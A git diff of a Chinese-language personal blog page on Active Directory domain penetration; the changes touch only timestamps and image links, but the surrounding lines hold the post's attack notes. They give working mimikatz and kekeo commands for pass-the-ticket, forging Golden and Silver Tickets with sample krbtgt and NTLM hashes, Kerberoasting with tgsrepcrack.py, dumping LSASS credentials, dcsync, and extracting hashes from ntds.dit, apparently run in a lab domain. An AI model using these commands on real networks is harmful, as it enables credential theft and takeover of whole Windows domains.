@@ -248,7 +248,7 @@
 
     
         <meta property="article:published_time" content="Fri Jan 19 2018 08:10:00 GMT-0500">
-        <meta property="article:modified_time" content="Mon Mar 26 2018 06:07:31 GMT-0400">
+        <meta property="article:modified_time" content="Mon Mar 26 2018 22:03:06 GMT-0400">
     
 
     <!-- The Twitter Card protocol -->
@@ -271,7 +271,7 @@
     "mainEntityOfPage": "http://yoursite.com/2018/01/19/域滲透相关/index.html",
     "headline": "域渗透相关",
     "datePublished": "Fri Jan 19 2018 08:10:00 GMT-0500",
-    "dateModified": "Mon Mar 26 2018 06:07:31 GMT-0400",
+    "dateModified": "Mon Mar 26 2018 22:03:06 GMT-0400",
     "author": {
         "@type": "Person",
         "name": "Sparrow",
@@ -530,7 +530,7 @@
 
 ####之后可以用\\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)
 (如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)
-</code></pre><p>0x03. Pass the Ticket (票据传递攻击PtT ,<a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> kekeo ticket 注入)<br>    <a href="http://www.vuln.cn/wp-content/uploads/drops/20160118/2016011804523676070160.png" target="_blank" rel="noopener">http://www.vuln.cn/wp-content/uploads/drops/20160118/2016011804523676070160.png</a><br>    与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希<br>    <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a><br>    在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。<br>    这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。<br>    新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。<br>    这种特别的攻击方法被称为”pass-the-ticket”攻击。<br>    <a href="http://image.3001.net/images/20141002/14122248951271.jpg" target="_blank" rel="noopener">http://image.3001.net/images/20141002/14122248951271.jpg</a><br>    拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket<br>    考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket<br>    Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a><br>    执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> :<br>        kekeo “tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”<br>    导入票据：<br>        kekeo “kerberos::ptt <a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>“</p>
+</code></pre><p>0x03. Pass the Ticket (票据传递攻击PtT ,<a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> kekeo ticket 注入)<br>    <img src="/2018/01/19/域滲透相关/域渗透相关/Kerberos.png" alt="Kerberos.png"><br>    与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希<br>    <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a><br>    在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。<br>    这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。<br>    新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。<br>    这种特别的攻击方法被称为”pass-the-ticket”攻击。<br>    <img src="/2018/01/19/域滲透相关/域渗透相关/pass-the-ticket.png" alt="pass-the-ticket.png"><br>    拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket<br>    考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket<br>    Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a><br>    执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> :<br>        kekeo “tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”<br>    导入票据：<br>        kekeo “kerberos::ptt <a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>“</p>
 <pre><code>以上3种:
     hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。
     凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。
@@ -563,12 +563,12 @@
         kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin
     4. 使用这张票据 
         kerberos::ptt administrator.kirbi.bin
-        Golden_Ticket1.png
+        ![Golden_Ticket1](域渗透相关/Golden_Ticket1.png)
     5. 然后我的低权限本地用户，就被提升到域管理权限
         kerberos::list
     6. 利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash
         lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)
-        Golden_Ticket2.png
+        ![Golden_Ticket2](域渗透相关/Golden_Ticket2.png)
 </code></pre><ol>
 <li>Silver Ticket (白银票据)<br> <a href="http://www.vuln.cn/6814" target="_blank" rel="noopener">http://www.vuln.cn/6814</a><br> <a href="http://www.4hou.com/technology/4622.html" target="_blank" rel="noopener">http://www.4hou.com/technology/4622.html</a><br> <a href="https://www.anquanke.com/post/id/93542" target="_blank" rel="noopener">https://www.anquanke.com/post/id/93542</a><br> 简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。<br> Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用<br> 所需条件(mimikatz生成silver ticket): <pre><code> a. /domain
  b. /sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )
@@ -588,7 +588,7 @@
  ==&gt;
  kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt
      (/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash
- Silver_Ticket1.png
+ ![Silver_Ticket1](域渗透相关/Silver_Ticket1.png)
 </code></pre></li>
 </ol>
 <p>0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)<br>    简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。<br>    这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。<br>    域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。<br>    域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。<br>    请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。<br>    所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>    (获得服务票据不需要提权，同时也不会发送数据到目标机器。)<br>    <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a><br>        python tgsrepcrack.py wordlist.txt sql.kirbi</p>
@@ -626,7 +626,7 @@ Tim给出的利用方法或工具包是使用工具集的组合来请求票证�
         dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}
         distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local
         ....
-    getspn.png
+    ![getspn](域渗透相关/getspn.png)
 2. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的
     System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。
 
@@ -653,7 +653,7 @@ https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
         mimikatz # log
         mimikatz # privilege::debug
         mimikatz # lsadump::lsa /inject
-        mimikatz-lsa.png
+        ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)
     2. 使用MIMIKATZ转储LSASS内存(获取域管理员凭据)
         mimikatz # sekurlsa::minidump c:\temp\lsass.dmp
         mimikatz # sekurlsa::logonpasswords
@@ -691,7 +691,7 @@ https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
         https://github.com/csababarta/ntdsxtract.git
         root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt
         root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv
-        libesedb__ntdsxtract__ntds.dit.png
+        ![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)
     6. 可创建和使用GOLDEN TICKET
     7. 卷影复制(VSS)
         ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)
